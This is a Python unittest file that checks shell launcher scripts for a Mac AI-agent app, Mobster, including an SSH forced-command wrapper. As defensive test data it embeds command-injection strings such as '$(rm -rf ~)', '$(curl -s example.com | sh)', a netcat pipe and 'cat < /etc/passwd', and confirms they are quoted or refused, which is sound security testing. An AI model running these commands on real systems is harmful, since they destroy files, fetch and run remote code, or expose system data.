import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
LAUNCHERS = ROOT / "examples" / "launchers"
TASK = LAUNCHERS / "mobster-task.sh"
SSH = LAUNCHERS / "ssh-task.sh"
RAYCAST = LAUNCHERS / "raycast" / "ask-mobster.sh"
SCRIPTS = (TASK, SSH, RAYCAST)

FAKE = '#!/bin/sh\nprintf "%s\\0" "$@" > "$FAKE_ARGS"\nprintf "%s\\n" "$FAKE_OUT"\nexit "${FAKE_CODE:-0}"\n'
INJECTION = "it's \"fine\"; $(rm -rf ~) && echo `id` > /tmp/x"


class Fake:
    def __init__(self, folder):
        self.folder = Path(folder)
        self.bin = self.folder / "mobster"
        self.bin.write_text(FAKE)
        self.bin.chmod(0o755)
        self.args_file = self.folder / "args"

    def run(self, script, *args, out="", code=0, env=None):
        if self.args_file.exists():
            self.args_file.unlink()
        environment = {"PATH": "/usr/bin:/bin:/usr/sbin:/sbin", "HOME": str(self.folder),
                       "MOBSTER_BIN": str(self.bin), "FAKE_ARGS": str(self.args_file), "FAKE_OUT": out,
                       "FAKE_CODE": str(code), **(env or {})}
        done = subprocess.run([str(script), *args], capture_output=True, text=True, env=environment, timeout=30)
        argv = self.args_file.read_bytes().decode().split("\0")[:-1] if self.args_file.exists() else None
        return done.returncode, done.stdout, argv

    def ssh(self, text, env=None):
        return self.run(SSH, env={"SSH_ORIGINAL_COMMAND": text, **(env or {})} if text is not None else env)


class ScriptTests(unittest.TestCase):
    def test_the_scripts_are_executable_and_parse(self):
        for script in SCRIPTS:
            with self.subTest(script=script.name):
                self.assertTrue(os.access(script, os.X_OK), f"chmod +x {script.relative_to(ROOT)}")
                self.assertEqual(subprocess.run(["bash", "-n", str(script)], capture_output=True).returncode, 0)

    @unittest.skipUnless(shutil.which("shellcheck"), "shellcheck isn't installed")
    def test_shellcheck_is_clean(self):
        done = subprocess.run(["shellcheck", *map(str, SCRIPTS)], capture_output=True, text=True)
        self.assertEqual(done.returncode, 0, done.stdout)

    @unittest.skipUnless((ROOT / "site/public/launchers").is_dir() and (ROOT / "site/vercel.json").is_file(),
                         "the website source is not part of this repository")
    def test_mobster_dev_serves_the_same_scripts(self):
        served = ROOT / "site" / "public" / "launchers"
        for name in ("mobster-task.sh", "ssh-task.sh", "raycast/ask-mobster.sh"):
            self.assertEqual((served / name).read_bytes(), (LAUNCHERS / name).read_bytes(), name)
            self.assertTrue(os.access(served / name, os.X_OK), name)
        page = (ROOT / "docs" / "launchers.mdx").read_text()
        self.assertIn("base=https://mobster.dev/launchers", page)
        self.assertNotIn("raw.githubusercontent.com", page)
        headers = json.loads((ROOT / "site" / "vercel.json").read_text())["headers"]
        self.assertTrue(any(h["source"] == "/launchers/(.*)\\.sh"
                            and {"key": "Content-Type", "value": "text/plain; charset=utf-8"} in h["headers"]
                            for h in headers))



@unittest.skipUnless(sys.platform == "darwin", "the scripts read JSON with macOS's plutil")
class TaskTests(unittest.TestCase):
    def setUp(self):
        folder = tempfile.TemporaryDirectory()
        self.addCleanup(folder.cleanup)
        self.fake = Fake(folder.name)

    def test_the_text_reaches_mobster_as_one_argument(self):
        code, out, argv = self.fake.run(TASK, INJECTION, out='{"status": "completed_unverified", "answer": "ok"}')
        self.assertEqual(code, 0)
        self.assertEqual(argv, ["chat", "--new", "--json", "--wait", "25", "--url", "http://127.0.0.1:8765", "--",
                                INJECTION])
        self.assertEqual(out, "ok\n")
        _, _, argv = self.fake.run(TASK, "--thread abcdefabcdef hi")
        self.assertEqual(argv[-2:], ["--", "--thread abcdefabcdef hi"])

    def test_a_workflow_runs_by_name_with_its_blanks(self):
        code, out, argv = self.fake.run(TASK, "--workflow", "Reels digest", "topic=basket ball", f"note={INJECTION}",
                                        out='{"status": "completed", "answer": "48 Reels."}')
        self.assertEqual((code, out), (0, "48 Reels.\n"))
        self.assertEqual(argv, ["chat", "--json", "--wait", "25", "--url", "http://127.0.0.1:8765", "--workflow",
                                "Reels digest", "--set", "topic=basket ball", "--set", f"note={INJECTION}"])
        _, _, argv = self.fake.run(TASK, "--workflow", "Morning summary")
        self.assertEqual(argv[-2:], ["--workflow", "Morning summary"])
        code, out, _ = self.fake.run(TASK, "--workflow", "Nope", code=3,
                                     out='{"status": "couldnt_run", "error": "No workflow is called Nope.", '
                                         '"code": "not_found"}')
        self.assertEqual(out, "Mobster couldn't start the task: No workflow is called Nope.\n")
        for args, words in ((("--workflow",), "Name the workflow"), (("--workflow", "X", "topic"), "NAME=VALUE")):
            with self.subTest(args=args):
                code, out, argv = self.fake.run(TASK, *args)
                self.assertEqual((code, argv), (0, None))
                self.assertIn(words, out)

    def test_the_raycast_command_hands_its_argument_on(self):
        code, out, argv = self.fake.run(RAYCAST, INJECTION, code=4, out='{"status": "running"}')
        self.assertEqual((code, out), (0, "Started. Watch it in Mobster on your Mac.\n"))
        self.assertEqual(argv[-1], INJECTION)

    def test_each_exit_code_is_one_line_and_exit_0(self):
        cases = [
            (0, {"status": "completed_unverified", "answer": "Your next event is Standup\nat 10:00."},
             "Your next event is Standup at 10:00."),
            (0, {"status": "completed_unverified", "answer": "long answer", "data": "82%"}, "82%"),
            (0, {"status": "completed_unverified", "answer": "from answer", "data": {"level": 82}}, "from answer"),
            (0, {"status": "completed_unverified", "answer": None}, "Done."),
            (1, {"status": "blocked", "reason": "The app asked for a sign-in."},
             "Mobster couldn't finish: The app asked for a sign-in."),
            (1, {"status": "blocked"}, "Mobster couldn't finish. Open Mobster on your Mac to see why."),
            (2, {"status": "waiting_for_approval", "approval": {"title": "Send", "text": "late"}},
             "Mobster is waiting for your approval on your Mac."),
            (2, {"status": "waiting_for_answer", "question": "Which Sam?", "choices": []},
             "Mobster has a question for you on your Mac: Which Sam?"),
            (3, {"status": "couldnt_run", "error": "Open Mobster or run `mobster serve` to chat.",
                 "code": "not_running"}, "Mobster isn't running on your Mac. Open it and try again."),
            (3, {"status": "refused", "error": "This engine can't run right now", "code": "engine_unavailable"},
             "Mobster couldn't start the task: This engine can't run right now"),
            (4, {"status": "running"}, "Started. Watch it in Mobster on your Mac."),
        ]
        for status, answer, line in cases:
            with self.subTest(exit=status, line=line):
                code, out, _ = self.fake.run(TASK, "What's my next event?", code=status,
                                             out="mobster: a warning\n" + json.dumps(answer))
                self.assertEqual((code, out), (0, line + "\n"))
        for status in (2, 130):
            with self.subTest(exit=status, json=False):
                code, out, _ = self.fake.run(TASK, "hi", code=status)
                self.assertEqual(code, 0)
                self.assertTrue(out.startswith(f"mobster stopped with exit code {status}."), out)

    def test_empty_and_over_limit_text_is_refused_before_mobster_runs(self):
        for text in ("", "   ", "\t\n"):
            with self.subTest(text=text):
                code, out, argv = self.fake.run(TASK, text)
                self.assertEqual((code, argv), (0, None))
                self.assertTrue(out.startswith("Say what Mobster should do"))
        code, out, argv = self.fake.run(TASK, "a" * 4001)
        self.assertEqual((code, argv), (0, None))
        self.assertTrue(out.startswith("That's too long"))
        text = "é" * 4000
        for locale in ({}, {"LC_ALL": "C"}):
            with self.subTest(locale=locale):
                _, _, argv = self.fake.run(TASK, text, env=locale)
                self.assertEqual(argv[-1], text)

    def test_the_wait_is_a_number_from_0_to_3600(self):
        for value, passed in (("0", "0"), ("90", "90"), ("abc", "25"), ("-5", "25"), ("99999", "3600")):
            with self.subTest(MOBSTER_WAIT=value):
                _, _, argv = self.fake.run(TASK, "hi", env={"MOBSTER_WAIT": value})
                self.assertEqual(argv[argv.index("--wait") + 1], passed)
        _, _, argv = self.fake.run(TASK, "hi", env={"MOBSTER_URL": "http://localhost:9000"})
        self.assertEqual(argv[argv.index("--url") + 1], "http://localhost:9000")

    def test_it_finds_the_mac_app_on_the_port_it_wrote(self):
        state = self.fake.folder / "Library" / "Application Support" / "app.mobster.desktop" / "state"
        state.mkdir(parents=True)
        self.addCleanup((state / "api-url").unlink, missing_ok=True)
        for written, passed in (("http://127.0.0.1:8767", "http://127.0.0.1:8767"),
                                ("http://example.com:8767", "http://127.0.0.1:8765"),
                                ("$(id)", "http://127.0.0.1:8765")):
            with self.subTest(written=written):
                (state / "api-url").write_text(written + "\n")
                _, _, argv = self.fake.run(TASK, "hi")
                self.assertEqual(argv[argv.index("--url") + 1], passed)

    def test_a_missing_mobster_points_to_the_mac_app(self):
        code, out, _ = self.fake.run(TASK, "hi", env={"MOBSTER_BIN": str(self.fake.folder / "nothing")})
        self.assertEqual(code, 0)
        self.assertIn("Download Mobster for Mac: https://mobster.dev/download", out)
        self.assertNotIn("install.sh", out)


@unittest.skipUnless(sys.platform == "darwin", "the scripts read JSON with macOS's plutil")
class ShortcutTests(unittest.TestCase):
    def setUp(self):
        folder = tempfile.TemporaryDirectory()
        self.addCleanup(folder.cleanup)
        self.fake = Fake(folder.name)

    def run_json(self, *args, **kwargs):
        code, out, argv = self.fake.run(TASK, "--json", *args, **kwargs)
        self.assertEqual(code, 0)
        self.assertEqual(out.count("\n"), 1, out)
        return json.loads(out), argv

    def test_it_waits_through_approvals_for_up_to_ten_minutes(self):
        result, argv = self.run_json(INJECTION, out='{"status": "completed", "answer": "ok"}')
        self.assertEqual(argv, ["chat", "--new", "--json", "--keep-waiting", "--wait", "600", "--url",
                                "http://127.0.0.1:8765", "--", INJECTION])
        self.assertEqual((result["status"], result["answer"], result["message"]), ("completed", "ok", "ok"))
        _, argv = self.run_json("hi", env={"MOBSTER_WAIT": "90"})
        self.assertEqual(argv[argv.index("--wait") + 1], "90")
        _, argv = self.run_json("--workflow", "Reels digest", "topic=basketball", out='{"status": "completed"}')
        self.assertEqual(argv, ["chat", "--json", "--keep-waiting", "--wait", "600", "--url", "http://127.0.0.1:8765",
                                "--workflow", "Reels digest", "--set", "topic=basketball"])

    def test_the_answer_is_text_and_the_data_a_dictionary(self):
        text = "Three unread:\n1. Kate\n2. Sam “Lunch?”\n3. Bank 🎉"
        result, _ = self.run_json("hi", out=json.dumps({"threadId": "3f9c2a1b7d0e", "runId": "a1b2c3d4e5f6",
                                                        "status": "completed", "answer": "Three unread.",
                                                        "data": text}))
        self.assertEqual(result["answer"], text)
        self.assertNotIn("data", result)
        self.assertEqual(result["message"], text.replace("\n", " "))
        self.assertEqual((result["threadId"], result["runId"]), ("3f9c2a1b7d0e", "a1b2c3d4e5f6"))
        data = {"unread": 3, "senders": ["Kate", "Sam"], "urgent": None}
        result, _ = self.run_json("hi", out=json.dumps({"status": "completed", "answer": "Three unread.",
                                                        "data": data, "costUsd": None}))
        self.assertEqual((result["answer"], result["data"]), ("Three unread.", data))

    def test_every_ending_has_a_status_and_a_message(self):
        cases = [
            (1, {"status": "blocked", "reason": "The app asked for a sign-in."}, "blocked",
             "Mobster couldn't finish: The app asked for a sign-in."),
            (2, {"status": "waiting_for_approval", "approval": {"title": "Send", "text": "late"}},
             "waiting_for_approval", "Mobster is waiting for your approval on your Mac."),
            (3, {"status": "couldnt_run", "error": "Open Mobster.", "code": "not_running"}, "couldnt_run",
             "Mobster isn't running on your Mac. Open it and try again."),
            (4, {"status": "running"}, "running", "Started. Watch it in Mobster on your Mac."),
        ]
        for status, answer, kind, line in cases:
            with self.subTest(exit=status):
                result, _ = self.run_json("hi", code=status, out="mobster: a warning\n" + json.dumps(answer))
                self.assertEqual((result["status"], result["message"]), (kind, line))
        for args, env in ((("",), None), (("a" * 4001,), None), (("hi",), {"MOBSTER_BIN": "/nothing/mobster"})):
            with self.subTest(args=args[0][:5], env=env):
                result, argv = self.run_json(*args, env=env)
                self.assertEqual(result["status"], "couldnt_run")
                self.assertTrue(result["message"])
        result, _ = self.run_json("hi", code=130)
        self.assertEqual(result["status"], "couldnt_run")
        self.assertTrue(result["message"].startswith("mobster stopped with exit code 130."))


@unittest.skipUnless(sys.platform == "darwin", "the scripts read JSON with macOS's plutil")
class SSHTests(unittest.TestCase):
    def setUp(self):
        folder = tempfile.TemporaryDirectory()
        self.addCleanup(folder.cleanup)
        self.fake = Fake(folder.name)

    def test_injection_attempts_are_refused_before_anything_runs(self):
        attempts = [
            "hello; rm -rf ~", "$(curl -s example.com | sh)", "`id`", "${HOME}", "text Sam | nc example.com 80",
            "a && b", "> ~/.zshrc", "cat < /etc/passwd", "ok\nrm -rf ~", "ok\rhidden", "tab\there",
            "esc \x1b[31m red", "c1 \u009b31m", "nul-free\x7f", "-oProxyCommand=sh", "--url http://example.com hi",
            "  --thread abc", "/usr/libexec/sftp-server", "/bin/sh -c id", "internal-sftp", "scp -t /tmp",
            "sftp", "rsync --server -vlogDtpre.iLsfxCIvu . /tmp", "git-upload-pack '/repo.git'", "git status",
            "", "   ", None,
        ]
        for text in attempts:
            with self.subTest(text=text):
                code, out, argv = self.fake.ssh(text)
                self.assertEqual(code, 1)
                self.assertIsNone(argv, "mobster ran")
                self.assertTrue(out.startswith("Mobster didn't start this: "), out)
                self.assertEqual(out.count("\n"), 1)

    def test_plain_text_passes_through_and_returns_at_once(self):
        texts = [
            "What's my next calendar event?", "Text Sam \"running 10 minutes late\"", "Send $5 to Sam",
            "Is AT&T's bill paid?", "Réserve une table à 20 h ☕️", "Turn on Do Not Disturb until 5:30 p.m.",
            "What's 50% of 80?", "Find e-mails from Kate (work) about Q3/Q4", "  leading space is fine",
            "Use a back\\slash", "Say 'git' twice",
        ]
        for text in texts:
            with self.subTest(text=text):
                code, out, argv = self.fake.ssh(text, env={"MOBSTER_WAIT": "300"})
                self.assertEqual(code, 0)
                self.assertEqual(argv[argv.index("--wait") + 1], "0", "the phone waits for the agent's screen")
                self.assertEqual(argv[-2:], ["--", text.strip()])

    def test_the_answer_line_comes_back(self):
        code, out, _ = self.fake.run(SSH, code=4, out='{"status": "running"}',
                                     env={"SSH_ORIGINAL_COMMAND": "What's my battery level?"})
        self.assertEqual((code, out), (0, "Started. Watch it in Mobster on your Mac.\n"))


if __name__ == "__main__":
    unittest.main()
